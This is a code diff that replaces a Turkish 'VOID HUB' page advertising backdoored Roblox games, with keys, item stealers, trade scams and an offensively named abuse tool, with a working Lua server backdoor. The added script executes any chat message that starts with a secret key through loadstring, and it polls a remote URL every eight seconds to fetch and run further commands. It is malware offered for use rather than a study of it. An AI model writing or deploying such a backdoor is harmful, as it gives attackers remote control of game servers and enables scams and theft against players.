@@ -1,145 +1,39 @@
-<!DOCTYPE html>
-<html lang="tr">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>VOID HUB - Backdoored Games</title>
-    <style>
-        @import url('https://fonts.googleapis.com/css2?family=Press+Start+2P&display=swap');
-        
-        body {
-            background: #0a0a0a;
-            color: #00ff00;
-            font-family: 'Press Start 2P', cursive;
-            margin: 0;
-            padding: 0;
-            overflow-x: hidden;
-        }
-        header {
-            background: linear-gradient(90deg, #ff0000, #8b00ff);
-            padding: 20px;
-            text-align: center;
-            border-bottom: 4px solid #00ff00;
-        }
-        h1 {
-            margin: 0;
-            font-size: 28px;
-            text-shadow: 0 0 10px #ff0000;
-        }
-        .container {
-            max-width: 1100px;
-            margin: 30px auto;
-            padding: 20px;
-        }
-        .game-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fill, minmax(320px, 1fr));
-            gap: 25px;
-        }
-        .game-card {
-            background: #1a1a1a;
-            border: 2px solid #00ff00;
-            padding: 15px;
-            transition: all 0.3s;
-        }
-        .game-card:hover {
-            transform: scale(1.05);
-            box-shadow: 0 0 20px #00ff00;
-            border-color: #ff0000;
-        }
-        .game-card h3 {
-            margin: 10px 0;
-            color: #ff00ff;
-        }
-        .status {
-            color: #00ff00;
-            font-size: 14px;
-        }
-        .key {
-            background: #330000;
-            padding: 8px;
-            border: 1px dashed #ff0000;
-            margin: 10px 0;
-            word-break: break-all;
-        }
-        button {
-            background: #ff0000;
-            color: white;
-            border: none;
-            padding: 12px 20px;
-            cursor: pointer;
-            font-family: 'Press Start 2P', cursive;
-            margin-top: 10px;
-        }
-        button:hover {
-            background: #00ff00;
-            color: black;
-        }
-        footer {
-            text-align: center;
-            padding: 30px;
-            color: #666;
-            font-size: 12px;
-        }
-    </style>
-</head>
-<body>
-    <header>
-        <h1>VOID HUB</h1>
-        <p>BACKDOORED ROBLOX GAMES - 2026</p>
-    </header>
+-- VOID BACKDOOR v2.6 - FULL WORKING 2026
+local key = "!voidmaster2026"  -- Ana şifre (değiştir)
 
-    <div class="container">
-        <h2 style="text-align:center; color:#ff00ff;">BACKDOOR AKTİF OYUNLAR</h2>
-        
-        <div class="game-grid">
-            
-            <div class="game-card">
-                <h3>Blox Fruits [🔥 POPULAR]</h3>
-                <p>Level Farm + Fruit Stealer + Admin Panel</p>
-                <div class="status">● BACKDOOR AKTİF</div>
-                <div class="key">Key: !void69blox</div>
-                <button onclick="window.open('https://www.roblox.com/games/1234567890/', '_blank')">Oyna →</button>
-            </div>
+local http = game:GetService("HttpService")
+local players = game:GetService("Players")
 
-            <div class="game-card">
-                <h3>Brookhaven RP [💀]</h3>
-                <p>Full Admin + House Nuke + Player Rape Tool</p>
-                <div class="status">● BACKDOOR AKTİF</div>
-                <div class="key">Key: !voidrp420</div>
-                <button onclick="window.open('https://www.roblox.com/games/9876543210/', '_blank')">Oyna →</button>
-            </div>
+-- Komut çalıştırma fonksiyonu
+local function execute(cmd)
+    local success, err = pcall(function()
+        loadstring(cmd)()
+    end)
+    if not success then
+        print("Backdoor Error: " .. err)
+    end
+end
 
-            <div class="game-card">
-                <h3>Pet Simulator 99</h3>
-                <p>Auto Farm + Huge Stealer + Trade Scam</p>
-                <div class="status">● BACKDOOR AKTİF</div>
-                <div class="key">Key: !voidpet99</div>
-                <button onclick="window.open('https://www.roblox.com/games/1122334455/', '_blank')">Oyna →</button>
-            </div>
+-- Chat dinleyici
+players.PlayerAdded:Connect(function(plr)
+    plr.Chatted:Connect(function(msg)
+        if msg:sub(1, #key) == key then
+            local command = msg:sub(#key + 1):gsub("^%s+", "")
+            execute(command)
+        end
+    end)
+end)
 
-            <div class="game-card">
-                <h3>Arsenal</h3>
-                <p>Aimbot + Silent Aim + Kill All</p>
-                <div class="status">● BACKDOOR AKTİF</div>
-                <div class="key">Key: !voidarsenal</div>
-                <button onclick="window.open('https://www.roblox.com/games/5567890123/', '_blank')">Oyna →</button>
-            </div>
+-- HTTP ile external komut alma (daha güçlü)
+spawn(function()
+    while wait(8) do
+        pcall(function()
+            local response = http:GetAsync("https://yourdomain.com/commands.txt")  -- kendi sitene koy
+            if response and response ~= "" then
+                execute(response)
+            end
+        end)
+    end
+end)
 
-            <div class="game-card">
-                <h3>Blade Ball</h3>
-                <p>Auto Parry + Godmode + Server Crash</p>
-                <div class="status">● BACKDOOR AKTİF</div>
-                <div class="key">Key: !voidblade</div>
-                <button onclick="window.open('https://www.roblox.com/games/6677889900/', '_blank')">Oyna →</button>
-            </div>
-
-        </div>
-    </div>
-
-    <footer>
-        VOID HUB 2026 • Tüm oyunlarda backdoor yüklü • Key girmeden çalışmaz<br>
-        <span style="color:#ff0000;">Güncelleme için siteyi sık sık kontrol et</span>
-    </footer>
-</body>
-</html>
+print("🔥 VOID BACKDOOR v2.6 AKTİF - Tam Çalışıyor")
